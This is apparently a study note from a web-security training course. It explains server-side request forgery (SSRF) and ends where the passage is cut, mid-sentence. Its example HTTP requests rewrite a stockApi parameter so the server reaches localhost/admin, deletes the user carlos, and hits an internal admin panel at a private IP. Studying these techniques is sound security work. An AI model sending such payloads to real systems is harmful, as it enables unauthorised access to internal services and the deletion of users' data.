![[SSRF.jpg]]
# Server-Side Request Forgery (SSRF)

An attacker can cause a server to make a connection to internal-only services within an organization or force the server to connect to external systems.

For SSRF attacks against a server, attackers cause it to make HTTP requests back to the server hosting the app, via loopback address typically via supplying a URL with a hostname like `127.0.0.1` or `localhost`. 
# SSRF Attacks Against Server

An app may show if an item is in stock via a query to a backend REST API by passing the URL via front-end HTTP request:

```json
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

Request can be modified to specify a URL local to the server:

```json
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

For example, there may be functions to delete users located at `/admin/delete?username=carlos` which could be called and executed via SSRF:

```json
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin/delete?username=carlos
```
# SSRF Against Back End Systems

Sometimes, the app server can interact with back-end systems which often have private IP addresses and protected by network topology. Internal backend systems may contain sensitive functionality without needing authentication.

For example, there may be an administrative interface on an IP such as `https://192.168.0.68/admin`. If so, a request such as the following can be sent:

```json
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

If the IP address is not known